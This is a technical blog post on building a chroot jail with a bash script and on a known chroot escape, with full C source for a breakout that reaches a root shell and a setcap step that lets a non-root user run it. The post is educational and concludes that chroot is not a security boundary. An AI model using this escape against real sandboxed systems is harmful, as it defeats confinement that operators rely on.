---
layout: post
title: "Chroot Jailing"
vanity: "2021-04-19-chroot-jail"
tags: [operating systems, bash, c]
excerpt_separator: <!--more-->
---

{% include blog_vars.html %}

In this post we'll study how to use the utlity `chroot` to create a jailed environment. We'll also cover some security holes with this approach.

<!--more-->

## A Simple Chroot Environment

The `chroot` command can be used to redefine the filesystem tree root as a new directory [1]. If we want a directory, say `$HOME/root/`, to be our new root, we can start a bash shell as:

{% highlight bash %}
mkdir $HOME/root/
sudo chroot $HOME/root/
{% endhighlight %}

This will fail with:

{% highlight bash %}
chroot: failed to run command ‘/bin/bash’: No such file or directory
{% endhighlight %}

The problem is that because `$HOME/root/` is empty, there are no binaries available, so we won't be able to do much.

We can use a simple Bash script to copy the binaries and their dependencies to the new root directory.

`setup.sh`:

{% highlight bash %}
# binaries we want in our chroot
bins=( "/bin/bash" "/bin/ls" "/bin/mkdir" )

NEW_ROOT="$HOME/root"

for bin_file in "${bins[@]}"
do

    # copy binaries
    bin_dir=$(dirname $bin_file)
    mkdir -p $NEW_ROOT$bin_dir
    cp $bin_file $NEW_ROOT$bin_dir

    deps=$(ldd $bin_file)

    # copy dependencies from binaries
    while read -r dep; do
        # ldd returns too much info. we're only interested
        # in the actual files
        dep_file=$(echo $dep | grep -o "\/[a-z0-9_\.\/\-]*")
        if [ ! -z "$dep_file" ]
        then
           dep_dir=$(dirname $dep_file)
           mkdir -p $NEW_ROOT$dep_dir
           cp $dep_file $NEW_ROOT$dep_dir
        fi
    done <<< "$deps"

done
{% endhighlight %}

This adds `/bin/bash`, `/bin/ls`, `/bin/mkdir` and their dependencies to the chroot environment. We can now do:

{% highlight bash %}
./setup.sh
sudo chroot $HOME/root/ /bin/bash
{% endhighlight %}

and in there, inspect the root directory:

{% highlight bash %}
$ ls /
bin  lib  lib64
{% endhighlight %}

note we can't go beyond that:

{% highlight bash %}
$ cd /
$ cd ..
$ ls
bin  lib  lib64
{% endhighlight %}

It's worth noting that `chroot` does not clone the subtree under the new root in any way. `chroot` seems to only impose restrictions on accesses above the new root.

We can verify that by creating a new directory inside the jailed environment:

{% highlight bash %}
$mkdir hello
{% endhighlight %}

If we exit the `chroot` (e.g. with `ctrl+d`) and return to the original process, we'll see the directory is still in `$HOME/root/`.

## Escaping chroot

It's possible to "escape" from a `chroot`ed environment if we have root access and a C binary smuggled in. [2] provides the following code (comments added):

`escape.c`:

{% highlight c %}
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>

#define TEMP_DIR "hole"

int main() {

    int dir_fd, i;

    mkdir(TEMP_DIR, 0755);
    // grab a reference to the current directory
    // since chroot() will change it
    dir_fd = open(".", O_RDONLY);

    chroot(TEMP_DIR);

    // chroot didn't close the dir_fd, so we can
    // use it to switch back to the previous
    // directory
    fchdir(dir_fd);
    close(dir_fd);

    // climb up to the top of the directory enough times
    for(i = 0; i < 1000; i++) {
      chdir("..");
    }

    chroot(".");

    return execl("/bin/sh", "-i", NULL);
}
{% endhighlight %}

The exploit seems to rely on a behavior of `chroot` which removes whatever restrictions from the current chroot environment once a new one is created, so if we have a reference to the directory from the first chroot, it's possible to climb up to the root directory of the original process.

<figure class="center_children">
    <img src="{{resources_path}}/escape.jpeg" alt="Men looking through a tunnel: scene from Shawshank Redemption" />
    <figcaption>Scene from <i>Shawshank Redemption</i></figcaption>
</figure>

Before doing the chroot, we compile and add the binary to the chroot target directory:

{% highlight bash %}
./setup.sh
gcc -static escape.c -o $HOME/root/escape
sudo chroot $HOME/root/ /bin/bash
{% endhighlight %}

Inside the chroot:

{% highlight bash %}
./escape
ls
{% endhighlight %}

which should display the contents from the original process.

## Chroot for non-root

By default, the chroot process has root privileges, but it's possible to start it as a specific user and group, so that we restrict what operations can be performed inside the chroot. For example, if `test_user` is a user we want make a chroot to for, we can do:

{% highlight bash %}
sudo chroot --userspec "test_user:test_user" $HOME/root/ /bin/bash
{% endhighlight %}

The problem is that since the owner of `$HOME/root/` is not `test_user`, they won't be able to do anything. We can create a `home` folder for them:

`setup.sh`:

{% highlight bash %}
...
mkdir -p $NEW_ROOT"/home"
sudo chown test_user:test_user $NEW_ROOT"/home"
{% endhighlight %}

We then generate the `escape` binary in the new home:

{% highlight bash %}
./setup.sh
gcc -static escape.c -o $HOME/root/escape/home
sudo chroot "test_user:test_user" $HOME/root/ /bin/bash
{% endhighlight %}

Inside the chroot:

{% highlight bash %}
home/./escape
ls
{% endhighlight %}

Since `chroot` requires root privileges, they won't be able to break out of the jail using the `escape` binary, so `ls` should still show the jailed directories.

## CAP_SYS_CHROOT capability

There's a more granular permission model than root which is called capabilities. It's possible to grant capabilities to binaries so they can perform operations even without root privileges.

One of them is the ability to run `chroot`, the `CAP_SYS_CHROOT` capability. We can add it to our smuggled binary.

`setup.sh`:

{% highlight bash %}
...
gcc -static escape.c -o $HOME/root/escape/home
sudo setcap 'cap_sys_chroot+ep' $NEW_ROOT"/home/escape"
{% endhighlight %}

Now `test_user` we'll be able to escape the jail even without root privileges.

This makes it hard to detect if there's a vulnerability inside a chroot environment. Hence it seems to be a general recommendation to not rely on chroot for security purposes [3].

## Code

The full code for [escape.c]({{github}}/escape.c) and [setup.sh]({{github}}/setup.sh) are available on [Github]({{github}}).

## References

* [[1](https://en.wikipedia.org/wiki/Chroot)] Wikipedia - Chroot
* [[2](https://filippo.io/escaping-a-chroot-jail-slash-1/
)] Escaping a chroot jail/1
* [[3](https://unix.stackexchange.com/questions/105/chroot-jail-what-is-it-and-how-do-i-use-it#comment36_109)] Unix & Linux: chroot “jail” - what is it and how do I use it?
